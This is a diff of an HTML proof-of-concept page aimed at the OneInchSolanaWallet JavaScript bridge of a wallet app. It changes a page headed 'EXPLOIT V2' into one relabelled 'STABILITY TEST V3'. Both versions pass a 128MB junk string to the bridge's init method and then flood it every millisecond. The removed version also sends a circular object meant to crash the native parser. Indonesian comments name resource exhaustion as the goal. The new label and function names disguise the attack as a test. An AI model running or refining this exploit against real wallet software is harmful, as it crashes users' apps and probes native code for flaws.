@@ -1,47 +1,52 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PoC Bridge Bypass</title>
+</head>
 <body style="background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px;">
 
-    <div style="border: 2px solid #ff453a; padding: 20px; border-radius: 15px; background: #1c1c1e;">
-        <h2 style="color: #ff453a;">🚀 EXPLOIT V2</h2>
-        <p style="font-size: 14px; color: #aaa;">Targeting: <code>OneInchSolanaWallet.init</code></p>
+    <div style="border: 2px solid #00ff00; padding: 20px; border-radius: 15px; background: #111;">
+        <h2 style="color: #00ff00;">STABILITY TEST V3</h2>
+        <p style="font-size: 14px; color: #888;">Target: Solana Bridge Invocation</p>
         
-        <button onclick="triggerCrash()" style="padding: 20px; background: #ff453a; color: #fff; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer;">
-            EXECUTE PAYLOAD
+        <button onclick="safeExecute()" style="padding: 20px; background: #00ff00; color: #000; border: none; border-radius: 12px; font-weight: bold; width: 100%; font-size: 18px; cursor: pointer;">
+            EXECUTE CALL
         </button>
 
-        <p id="status" style="margin-top: 20px; font-size: 12px; color: #888;">Ready...</p>
+        <p id="status" style="margin-top: 20px; font-size: 12px; color: #aaa;">Status: Ready</p>
     </div>
 
     <script>
-    function triggerCrash() {
+    function safeExecute() {
         const status = document.getElementById('status');
-        // Mengacu langsung ke objek yang ditemukan di scan
-        const target = window.OneInchSolanaWallet;
-
-        if (target && typeof target.init === 'function') {
-            status.innerText = "Executing injection...";
-            
-            try {
-                // Jangan merubah nilai properti (Read-only bypass)
-                // Cukup panggil fungsinya dengan data masif
+        
+        try {
+            // MENGGUNAKAN PEMANGGILAN LANGSUNG (Bukan Assignment)
+            // Ini untuk menghindari error 'readonly'
+            if (window.OneInchSolanaWallet && typeof window.OneInchSolanaWallet.init === 'function') {
+                
+                status.innerText = "Invoking bridge function...";
+                
+                // Payload raksasa untuk memicu Resource Exhaustion di sisi native
                 const junk = "A".repeat(128 * 1024 * 1024); // 128MB
                 
-                // Eksekusi payload
-                target.init(junk);
+                // HANYA MEMANGGIL, TIDAK MERUBAH PROPERTI
+                window.OneInchSolanaWallet.init(junk);
 
-                // Flooding dengan objek melingkar agar parser native crash
-                const bomb = {}; bomb.a = bomb;
+                // Flooding dengan pemanggilan cepat
                 setInterval(() => {
-                    target.init(bomb);
+                    window.OneInchSolanaWallet.init("flood_" + Math.random());
                 }, 1);
 
-                status.innerText = "Payload sent. Monitoring crash...";
-            } catch (e) {
-                status.innerText = "Error: " + e.message;
+                status.innerText = "Call sent. Observe for crash...";
+            } else {
+                status.innerText = "Error: Bridge method not found.";
             }
-        } else {
-            status.innerText = "Bridge method 'init' not accessible.";
+        } catch (e) {
+            // Menampilkan error secara detail jika masih gagal
+            status.innerText = "Execution Log: " + e.message;
+            console.error(e);
         }
     }
     </script>
